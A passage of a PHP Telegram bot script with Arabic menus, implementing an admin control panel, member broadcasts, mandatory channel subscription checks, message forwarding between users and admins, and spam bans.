<?php
// الملف مجاني وتم نشره في قناة @FF55Q
$token = 'توكن';  // Token Your Bot
$admin = 'ايدي'; // Your Id
define('API_KEY',$token); // Token Your Bot
$sting = json_decode(file_get_contents("sting.json"),true); 
$update = json_decode(file_get_contents('php://input'));
header('Content-Type: application/json; charset=utf-8');
//file_get_contents("https://api.telegram.org/bot".API_KEY."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']);
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
	$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
function apiUseYhya($data = []){
	global $sting;
	$Url = $sting['sting']['urlIndex'];
	$data['Pass'] = 'The PassWord QSD In Bot SuperQSD In Server';
	return json_decode(file_get_contents($Url."?".http_build_query($data)),true);
}
$members = explode("\n",file_get_contents("members.txt"));
$countmembers = count($members);
function YhyaSyrian($Size)
{
    if ($Size < 1000) {
        return "$Size B";
    } elseif (($Size / 1024) < 1000) {
        return round($Size / 1024,1).' KB';
    } elseif (($Size / 1024 / 1024) < 1000) {
        return round($Size / 1024 / 1024,1).' MB';
    } elseif (($Size / 1024 / 1024 / 1024) < 1000) {
        return round($Size / 1024 / 1024 / 1024,1).' GB';
    } else {
        return round($Size / 1024 / 1024 / 1024 / 1024,1).' TB';
    }
}
	function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
function sender(){
$members = explode("\n",file_get_contents("members.txt"));
$sting = json_decode(file_get_contents("sting.json"),true); 
	$method = $sting['send']['method'];
    $count = count($members);
	$text = $sting['send']['text'];
	$mode = $sting['send']['mode'];
	$num = $sting['send']['num'];
	$id = $sting['send']['from'];
	$mes = $sting['send']['id'];
	$ms = $sting['send']['mesid'];
	$file = $sting['send']['file'];
	$caption = $sting['send']['caption'];
	for($i=$num;$i<=$num + 30;$i++){
		$to = $members[$i];
		if($i > $count){
			break;
		}
		if($to == null){
			$sting['send']['ban'] += 1;
			continue;
		}
		if($method == 'text'){
			$ok = bot('sendmessage',[
			'chat_id'=>$to, 
			'text'=>$text]);
		}elseif($method == "forward"){
			$ok = bot('forwardMessage',[
		'chat_id'=>$to,
		'from_chat_id'=>$id,
		'message_id'=>$ms,
		]);
		}else{
		$ok = bot('send'.str_replace('_','',$method),[
		 "chat_id"=>$to,
		 $method=>$file,
		'caption'=>$caption,
		 ]);
		}
		if(!$ok->ok){
		$sting['send']['ban'] += 1;
		continue;
		}
		if($mode == 'pin'){
			bot('pinchatMessage', [
			'chat_id'=>$to,
			'message_id'=>$ok->result->message_id,
			]);
		}	
	} // End Loop
$ban = $sting['send']['ban'];
$all = $count - $ban;
if($i > $count){
bot('EditMessageText',[
	'chat_id'=>$id, 
	'message_id'=>$mes,
	'text'=>"
تم الإنتهاء من الإذاعة بنجاح ✓
عدد الأشخاص التي تم الإرسال إليهم : $i 👤
عدد الأشخاص التي قامو بحظر البوت $ban 💔
عدد الأشخاص التي وصلت لهم الإذاعة $all 🗣️
",
]);
unset($sting['send']);
file_put_contents("sting.json",json_encode($sting,64|128|256));
}else{
$Syria = round($count / 100,2);
$Nesb = round($i / $Syria,1).'٪';
bot('EditMessageText',[
	'chat_id'=>$id, 
	'message_id'=>$mes,
	'text'=>"
تم الإذاعة لـ
عدد الأشخاص التي تم الإرسال إليهم : $i 👤
عدد الأشخاص التي قامو بحظر البوت $ban 💔
نسبة الأشخاص التي وصلت لهم الإذاعة هي : $Nesb
جاري الإذاعة للباقي 😉
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'الاستمرار بالإذاعة 💕','url'=>'https://'.$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']]],
]]),
]);
echo "تم الإذاعة لـ
عدد الأشخاص التي تم الإرسال إليهم : $i 👤
عدد الأشخاص التي قامو بحظر البوت $ban 💔
نسبة الأشخاص التي وصلت لهم الإذاعة هي : $Nesb
جاري الإذاعة للباقي 😉";
$sting['send']['num'] = $i;
file_put_contents("sting.json",json_encode($sting,64|128|256));
header("Refresh:2");
}
return $i;
} // End Function 
	$ip = getUserIP();
$ipok = explode(".",$ip);
$YhyaSyrian = file_get_contents('php://input');
if($ipok[0] != "91" and $ipok[1] != "108" and preg_match('/update_id/',$YhyaSyrian)){
exit;
}
if($sting['send'] != null and !$update){
sender();
}
if(!is_dir('spam')){
	mkdir('spam');
}
$d = date('D');
$day = explode("\n",file_get_contents($d.".txt"));
$days = ['Sat','Sun','Mon','Tue','Wed','Thu','Fri'];
foreach($days as $Day){
if($Day == $d){
continue;
}
unlink($Day.'.txt');
}
if(isset($update->message)){
$message = $update->message;
$message_id = $update->message->message_id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
$tc = $message->chat->type;
}
if(isset($update->callback_query)){
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $chat_id;
$tc = $update->callback_query->message->chat->type;
}
$re = $update->message->reply_to_message;
$re_id = $update->message->reply_to_message->from->id;
$re_user = $update->message->reply_to_message->from->username;
$re_name = $update->message->reply_to_message->from->first_name;
$re_messagid = $update->message->reply_to_message->message_id;
$re_chatid = $update->message->reply_to_message->chat->id;
$photo = $message->photo;
$video = $message->video;
$sticker = $message->sticker;
$file = $message->document;
$audio = $message->audio;
$voice = $message->voice;
$caption = $message->caption;
$photo_id = $message->photo[0]->file_id;
$video_id= $message->video->file_id;
$sticker_id = $message->sticker->file_id;
$file_id = $message->document->file_id;
$music_id = $message->audio->file_id;
$voice_id = $message->voice->file_id;
$video_note = $message->video_note;
$video_note_id = $video_note->file_id;
$forward = $message->forward_from_chat;
$forward_id = $message->forward_from_chat->id;
$title = $message->chat->title;
$mei = bot('getme',['bot'])->result->id;
$admin = "ايدي";// Your Id
$countmembers = count($members);
if($sting['sting']['admins'][0] == null){
	$sting['sting']['admins'][0] = $admin;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
	}
$admins = $sting['sting']['admins'];
$admin = $admins[0];
	$ch = $sting['sting']['ch1'];
$ok = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$mei]);
if($ch != null and $ok->ok == "true" and $ok->result->status != "left"){
if(preg_match("/(-100)(.)/", $ch) and !preg_match("/(.)(-100)(.)/", $ch)){
	$link = bot("getchat",['chat_id'=>$ch])->result->invite_link;
	if($link != null){
		$link = $link;
$link2 = $link;
		}else{
			$link = bot("exportChatInviteLink",['chat_id'=>$ch])->result;
$link2 = $link;
			}
	}elseif(preg_match("/(@)(.)/", $ch) and !preg_match("/(.)(@)(.)/", $ch)){
		$link = "$ch";
$ch3 = str_replace("@","",$ch);
$link2 = "https://t.me/$ch3";
		}
		$ok = bot('getChat',['chat_id'=>$ch]);
		$status = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$from_id])->result->status;
if($status != "member" and $status != "creator" and $status != "administrator"){
if($message){
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>$ok->result->title,'url'=>$link2]],
]])
]);
exit();
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>$ok->result->title,'url'=>$link2]],
]])
]);
exit();
		}
}
}
$ch = $sting['sting']['ch2'];
$ok = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$mei]);
if($ch != null and $ok->ok == "true" and $ok->result->status != "left"){
if(preg_match("/(-100)(.)/", $ch) and !preg_match("/(.)(-100)(.)/", $ch)){
	$link = bot("getchat",['chat_id'=>$ch])->result->invite_link;
	if($link != null){
		$link = $link;
$link2 = $link;
		}else{
			$link = bot("exportChatInviteLink",['chat_id'=>$ch])->result;
$link2 = $link;
			}
	}elseif(preg_match("/(@)(.)/", $ch) and !preg_match("/(.)(@)(.)/", $ch)){
		$link = "$ch";
$ch3 = str_replace("@","",$ch);
$link2 = "https://t.me/$ch3";
		}
		$status = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$from_id])->result->status;
		$ok = bot('getChat',['chat_id'=>$ch]);
if($status != "member" and $status != "creator" and $status != "administrator"){
if($message){
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>$ok->result->title,'url'=>$link2]],
]])
]);
exit();
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>$ok->result->title,'url'=>$link2]],
]])
]);
exit();
		}
}
}
$ch = $sting['sting']['ch3'];
$ok = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$mei]);
if($ch != null and $ok->ok == "true" and $ok->result->status != "left"){
if(preg_match("/(-100)(.)/", $ch) and !preg_match("/(.)(-100)(.)/", $ch)){
	$link = bot("getchat",['chat_id'=>$ch])->result->invite_link;
	if($link != null){
		$link = $link;
$link2 = $link;
		}else{
			$link = bot("exportChatInviteLink",['chat_id'=>$ch])->result;
$link2 = $link;
			}
	}elseif(preg_match("/(@)(.)/", $ch) and !preg_match("/(.)(@)(.)/", $ch)){
		$link = "$ch";
$ch3 = str_replace("@","",$ch);
$link2 = "https://t.me/$ch3";
		}
		$status = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$from_id])->result->status;
		$ok = bot('getChat',['chat_id'=>$ch]);
if($status != "member" and $status != "creator" and $status != "administrator"){
if($message){
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>$ok->result->title,'url'=>$link2]],
]])
]);
exit();
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>$ok->result->title,'url'=>$link2]],
]])
]);
exit();
		}
}
}
$ch = $sting['sting']['ch4'];
$ok = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$mei]);
if($ch != null and $ok->ok == "true" and $ok->result->status != "left"){
if(preg_match("/(-100)(.)/", $ch) and !preg_match("/(.)(-100)(.)/", $ch)){
	$link = bot("getchat",['chat_id'=>$ch])->result->invite_link;
	if($link != null){
		$link = $link;
$link2 = $link;
		}else{
			$link = bot("exportChatInviteLink",['chat_id'=>$ch])->result;
$link2 = $link;
			}
	}elseif(preg_match("/(@)(.)/", $ch) and !preg_match("/(.)(@)(.)/", $ch)){
		$link = "$ch";
$ch3 = str_replace("@","",$ch);
$link2 = "https://t.me/$ch3";
		}
		$status = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$from_id])->result->status;
		$ok = bot('getChat',['chat_id'=>$ch]);
if($status != "member" and $status != "creator" and $status != "administrator"){
if($message){
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>$ok->result->title,'url'=>$link2]],
]])
]);
exit();
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>$ok->result->title,'url'=>$link2]],
]])
]);
exit();
		}
}
}
$ch = $sting['sting']['ch5'];
$ok = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$mei]);
if($ch != null and $ok->ok == "true" and $ok->result->status != "left"){
if(preg_match("/(-100)(.)/", $ch) and !preg_match("/(.)(-100)(.)/", $ch)){
	$link = bot("getchat",['chat_id'=>$ch])->result->invite_link;
	if($link != null){
		$link = $link;
$link2 = $link;
		}else{
			$link = bot("exportChatInviteLink",['chat_id'=>$ch])->result;
$link2 = $link;
			}
	}elseif(preg_match("/(@)(.)/", $ch) and !preg_match("/(.)(@)(.)/", $ch)){
		$link = "$ch";
$ch3 = str_replace("@","",$ch);
$link2 = "https://t.me/$ch3";
		}
		$status = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$from_id])->result->status;
		$ok = bot('getChat',['chat_id'=>$ch]);
if($status != "member" and $status != "creator" and $status != "administrator"){
if($message){
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>$ok->result->title,'url'=>$link2]],
]])
]);
exit();
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>$ok->result->title,'url'=>$link2]],
]])
]);
exit();
		}
}
}
$time = date('Y-n-d');
$bandspam = explode("\n",file_get_contents("spam/$time"));
		if(in_array($chat_id,$sting['sting']['band']) or in_array($chat_id,$bandspam) and $message){
	exit;
}
		if(!$sting['sting']['bot']){
	$sting['sting']['bot'] = "true";
	$sting['sting']['spam'] = "false";
	$sting['sting']['spamn'] = 5;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
	}
	if($tc == 'private' and $chat_id != $admin and !in_array($chat_id,$sting['sting']['admins'])){
		if($sting['sting']['bot'] == "false"){
			bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	عذرا البوت في صيانة ⁦♻️⁩❗
	",
	'reply_to_meesage_id'=>$message_id,
	]);
	exit;
			}
			
				if(!$data and count($sting['ford']) >= 1 and $chat_id != $admin and !in_array($chat_id,$sting['sting']['admins'])){
					foreach($sting['ford'] as $admin){
				bot('forwardMessage', [
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
				}
				}
				$coun = count($sting['tw']);
if($coun >= 1 and $tc == 'private'){
					if($text != "/start" and $chat_id != $admin and !in_array($chat_id,$sting['sting']['admins']) and $text){
					foreach($sting['tw'] as $admin){
						$mes= bot('forwardMessage',[
 'chat_id'=>$admin,
 'from_chat_id'=>$chat_id,
 'message_id'=>$message_id,
]);
$send = $mes->result->message_id;
$sting['tws'][$send]['from'] = $from_id;
$sting['tws'][$send]['id'] = $message_id;
file_put_contents("sting.json",json_encode($sting,64|128|256));
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"تم إرسال رسالتك للمطور بنجاح ✅",
'reply_to_meesage_id'=>$message_id,
]);
						}
						}
						}
if(in_array($chat_id,$sting['sting']['admins']) and $message->reply_to_message and $sting['tws'][$message->reply_to_message->message_id]){
$messageid = $sting['tws'][$message->reply_to_message->message_id]['id'];
$YhyaSyrian = $sting['tws'][$message->reply_to_message->message_id]['from'];
							if($text){
bot('sendMessage', [
'chat_id'=>$YhyaSyrian,
'text'=>"$text",
'reply_to_meesage_id'=>$messageid,
]);
}elseif($photo){
bot('sendphoto', [
'chat_id'=>$YhyaSyrian,
'photo'=>$photo_id,
'caption'=>$caption,
'reply_to_meesage_id'=>$messageid,
]);
}elseif($video){
bot('Sendvideo',[
'chat_id'=>$YhyaSyrian,
'video'=>$video_id,
'caption'=>$caption,
'reply_to_meesage_id'=>$messageid,
]);
}elseif($video_note){
bot('Sendvideonote',[
'chat_id'=>$YhyaSyrian,
'video_note'=>$video_note_id,
]);
}elseif($sticker){
bot('Sendsticker',[
'chat_id'=>$YhyaSyrian,
'sticker'=>$sticker_id,
'reply_to_meesage_id'=>$messageid,
]);
}elseif($file){
bot('SendDocument',[
'chat_id'=>$YhyaSyrian,
'document'=>$file_id,
'caption'=>$caption,
'reply_to_meesage_id'=>$messageid,
]);
}elseif($music){
bot('Sendaudio',[
'chat_id'=>$YhyaSyrian,
'audio'=>$music_id,
'caption'=>$caption,
'reply_to_meesage_id'=>$messageid,
]);
}elseif($voice){
bot('Sendvoice',[
'chat_id'=>$YhyaSyrian,
'voice'=>$voice_id,
'caption'=>$caption,
'reply_to_meesage_id'=>$messageid,
]);
}
							bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم إرسال رسالتك بنجاح ✅
	",
	'reply_to_meesage_id'=>$message_id,
	]);
							}
if($tc == 'private' and !in_array($from_id,$members)){
	if($tc == 'private' and $text == "/start" and count($sting['onstart']) >= 1 and $chat_id != $admin and !in_array($chat_id,$sting['sting']['admins'])){
		$count = count($members);
		foreach($sting['onstart'] as $admin){
				bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
٭ تم دخول شخص جديد الى البوت الخاص بك 👾
            -----------------------
• معلومات العضو الجديد .

• الاسم : [".str_replace(['[',']','(',')'],'',$name)."](tg://user?id=$from_id) ،
• المعرف : *@$user* ،
• الايدي : `$from_id` ،
            -----------------------
• عدد الاعضاء الكلي : $count ،
" ,
'parse_mode'=>'MarkDown'
]);
				}
				}
	file_put_contents('members.txt',$from_id."\n",FILE_APPEND);
	}
	if(!in_array($from_id,$day)){
file_put_contents($d.'.txt',$from_id."\n",FILE_APPEND);
		}
$numspam = $sting['sting']['spamn'];
if($text == "/start" or $texr == "/admin"){
	if(in_array($chat_id,$sting['ford'])){$ford = 'مفعل ✅';}else{$ford = 'معطل ❎';}
	if(in_array($chat_id,$sting['onstart'])){$onstart = 'مفعل ✅';}else{$onstart = 'معطل ❎';}
	$bot = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['bot']);
	if(in_array($chat_id,$sting['tw'])){$tw = 'مفعل ✅';}else{$tw = 'معطل ❎';}
 $spam = str_replace(['false','true'],['معطل ❎',' مفعل ✅'],$sting['sting']['spam']);
	if($chat_id == $admin){
		bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	أهلا بك ⁦🙋🏻‍♂️⁩ عزيزي الأدمن ⁦👨🏻‍🔧⁩
	يمكنك التحكم ⁦⚙️⁩ بكامل البوت من هنا 🦾
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"قسم الإشتراك الإجباري 🔱 الخاص 👤",'callback_data'=>'ch']
],
[
['text'=>"التوجيه $ford 🔄",'callback_data'=>'ford'],['text'=>"التنبيه $onstart 📣",'callback_data'=>'onstart']
],
[
['text'=>"الإحصائيات 📊",'callback_data'=>'km']
],
[
['text'=>"البوت $bot 🤖",'callback_data'=>"bot"],['text'=>"التواصل $tw 📞",'callback_data'=>'tw']
],
[
['text'=>"قسم الحظر 🚫",'callback_data'=>"band"]
],
[
['text'=>"التكرار $spam",'callback_data'=>"spam"],['text'=>"عدد التكرار $numspam 😬",'callback_data'=>"numspam"]
],
[
['text'=>"إذاعة 📣👤",'callback_data'=>'sendprofile'],['text'=>"توجيه 🔄",'callback_data'=>"forward"]
],
[
['text'=>"الأدمنة 👥⁦👮🏻‍♂️⁩",'callback_data'=>"admins"]
],
[
['text'=>"رفع مشرف ⁦👮🏻‍♂️⁩",'callback_data'=>"addadmin"],['text'=>"تنزيل مشرف ⁦👳🏻‍♂️⁩",'callback_data'=>"deladmin"]
],
[
['text'=>"نقل ملكية البوت 🔱",'callback_data'=>"MoveAdmin"]
],
[
['text'=>"جلب نسخة بيانات 📥🗃",'callback_data'=>"Download"],['text'=>"رفع نسخة 📤🗃",'callback_data'=>"Update"]
],
[
['text'=>"حذف التخزين المؤقت 🗑️⌛",'callback_data'=>"DeletFile"]
],
[
['text'=>"تعين نص الترحيب 💬♥️",'callback_data'=>'StartText'],['text'=>"تعين صورة الترحيب 🖼️♥️",'callback_data'=>'StartPhoto']
],
 [
['text'=>"مسح البيانات 🗑️🗂️",'callback_data'=>'DalAll']
],
[
['text'=>"إضافة إندكس ➕📥",'callback_data'=>'addIndex'],['text'=>"مسح إندكس ➖🗑️",'callback_data'=>'delIndex'],['text'=>"تصفير 🗑️",'callback_data'=>'delAllIndexs']
],
[
['text'=>"أضف رابط ⚙️",'callback_data'=>'urlindex']
],
]])
	]);
	$sting['sting']['sting'] = null;
	unset($sting['addIndex']);
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
		}elseif(in_array($chat_id,$sting['sting']['admins'])){
			bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	أهلا🙋🏻‍♂️⁩ عزيزي الأدمن ⁦👨🏻‍🔧⁩
	يمكنك التحكم ⁦⚙️⁩ بكامل البوت من هنا 🦾
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"قسم الإشتراك الإجباري 🔱 الخاص 👤",'callback_data'=>'ch']
],
[
['text'=>"التوجيه $ford 🔄",'callback_data'=>'ford'],['text'=>"التنبيه $onstart 📣",'callback_data'=>'onstart']
],
[
['text'=>"الإحصائيات 📊",'callback_data'=>'km']
],
[
['text'=>"البوت $bot 🤖",'callback_data'=>"bot"],['text'=>"التواصل $tw 📞",'callback_data'=>'tw']
],
[
['text'=>"قسم الحظر 🚫",'callback_data'=>"band"]
],
[
['text'=>"التكرار $spam",'callback_data'=>"spam"],['text'=>"عدد التكرار $numspam 😬",'callback_data'=>"numspam"]
],
[
['text'=>"إذاعة 📣👤",'callback_data'=>'sendprofile'],['text'=>"توجيه 🔄",'callback_data'=>"forward"]
],

]])
	]);
	$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
			}
	}
if($data == "back"){
	if(in_array($chat_id,$sting['ford'])){$ford = 'مفعل ✅';}else{$ford = 'معطل ❎';}
	if(in_array($chat_id,$sting['onstart'])){$onstart = 'مفعل ✅';}else{$onstart = 'معطل ❎';}
	$bot = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['bot']);
	if(in_array($chat_id,$sting['tw'])){$tw = 'مفعل ✅';}else{$tw = 'معطل ❎';}
	
 $spam = str_replace(['false','true'],['معطل ❎',' مفعل ✅'],$sting['sting']['spam']);
	if($chat_id == $admin){
		bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	أهلا بك ⁦🙋🏻‍♂️⁩ عزيزي الأدمن ⁦👨🏻‍🔧⁩
	يمكنك التحكم ⁦⚙️⁩ بكامل البوت من هنا 🦾
	",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"قسم الإشتراك الإجباري 🔱 الخاص 👤",'callback_data'=>'ch']
],
[
['text'=>"التوجيه $ford 🔄",'callback_data'=>'ford'],['text'=>"التنبيه $onstart 📣",'callback_data'=>'onstart']
],
[
['text'=>"الإحصائيات 📊",'callback_data'=>'km']
],
[
['text'=>"البوت $bot 🤖",'callback_data'=>"bot"],['text'=>"التواصل $tw 📞",'callback_data'=>'tw']
],
[
['text'=>"قسم الحظر 🚫",'callback_data'=>"band"]
],
[
['text'=>"التكرار $spam",'callback_data'=>"spam"],['text'=>"عدد التكرار $numspam 😬",'callback_data'=>"numspam"]
],
[
['text'=>"إذاعة 📣👤",'callback_data'=>'sendprofile'],['text'=>"توجيه 🔄",'callback_data'=>"forward"]
],
[
['text'=>"الأدمنة 👥⁦👮🏻‍♂️⁩",'callback_data'=>"admins"]
],
[
['text'=>"رفع مشرف ⁦👮🏻‍♂️⁩",'callback_data'=>"addadmin"],['text'=>"تنزيل مشرف ⁦👳🏻‍♂️⁩",'callback_data'=>"deladmin"]
],
[
['text'=>"نقل ملكية البوت 🔱",'callback_data'=>"MoveAdmin"]
],
[
['text'=>"جلب نسخة بيانات 📥🗃",'callback_data'=>"Download"],['text'=>"رفع نسخة 📤🗃",'callback_data'=>"Update"]
],
[
['text'=>"حذف التخزين المؤقت 🗑️⌛",'callback_data'=>"DeletFile"]
],
[
['text'=>"تعين نص الترحيب 💬♥️",'callback_data'=>'StartText'],['text'=>"تعين صورة الترحيب 🖼️♥️",'callback_data'=>'StartPhoto']
],
 [
['text'=>"مسح البيانات 🗑️🗂️",'callback_data'=>'DalAll']
],
[
['text'=>"إضافة إندكس ➕📥",'callback_data'=>'addIndex'],['text'=>"مسح إندكس ➖🗑️",'callback_data'=>'delIndex'],['text'=>"تصفير 🗑️",'callback_data'=>'delAllIndexs']
],
[
['text'=>"أضف رابط ⚙️",'callback_data'=>'urlindex']
],
]])
	]);
	$sting['sting']['sting'] = null;
	unset($sting['addIndex']);
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
		}elseif(in_array($chat_id,$sting['sting']['admins'])){
			bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	أهلا بك ⁦🙋🏻‍♂️⁩ عزيزي الأدمن ⁦👨🏻‍🔧⁩
	يمكنك التحكم ⁦⚙️⁩ بكامل البوت من هنا 🦾
	",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"قسم الإشتراك الإجباري 🔱 الخاص 👤",'callback_data'=>'ch']
],
[
['text'=>"التوجيه $ford 🔄",'callback_data'=>'ford'],['text'=>"التنبيه $onstart 📣",'callback_data'=>'onstart']
],
[
['text'=>"الإحصائيات 📊",'callback_data'=>'km']
],
[
['text'=>"البوت $bot 🤖",'callback_data'=>"bot"],['text'=>"التواصل $tw 📞",'callback_data'=>'tw']
],
[
['text'=>"قسم الحظر 🚫",'callback_data'=>"band"]
],
[
['text'=>"التكرار $spam",'callback_data'=>"spam"],['text'=>"عدد التكرار $numspam 😬",'callback_data'=>"numspam"]
],
[
['text'=>"إذاعة 📣👤",'callback_data'=>'sendprofile'],['text'=>"توجيه 🔄",'callback_data'=>"forward"]
],

]])
	]);
	$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
			}
	}
if($chat_id == $admin or in_array($chat_id,$sting['sting']['admins'])){
	if($data == 'ford' or $data == 'onstart' or $data == 'bot' or $data == 'tw' or $data == "spam"){
		$a = str_replace(['ford','onstart','bot','tw','spam'],['التوجيه 🔄','التنبيه 📣','البوت 🤖','التواصل 📞','التكرار ♻️'],$data);
		if($data == 'ford' or $data == 'onstart' or $data == 'tw'){
if(in_array($chat_id,$sting[$data])){
$num = array_search($chat_id,$sting[$data]);
            	unset($sting[$data][$num]);
            $b = "تعطيل ❎";
            }else{
            $sting[$data][] = $chat_id;
            $b = "تفعيل ✅";
            }
}else{
if($sting['sting'][$data] == "true"){
			$sting['sting'][$data] = "false";
			$b = "تعطيل ❎";
			}else{
				$sting['sting'][$data] = "true";
			$b = "تفعيل ✅";
				}
				file_put_contents("sting.json",json_encode($sting,64|128|256));
				}
				bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"تم $b $a ❗", 
            'show_alert'=>true 
            ]); 
            if(in_array($chat_id,$sting['ford'])){$ford = 'مفعل ✅';}else{$ford = 'معطل ❎';}
	if(in_array($chat_id,$sting['onstart'])){$onstart = 'مفعل ✅';}else{$onstart = 'معطل ❎';}
	$bot = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['bot']);
	if(in_array($chat_id,$sting['tw'])){$tw = 'مفعل ✅';}else{$tw = 'معطل ❎';}
 $spam = str_replace(['false','true'],['معطل ❎',' مفعل ✅'],$sting['sting']['spam']);
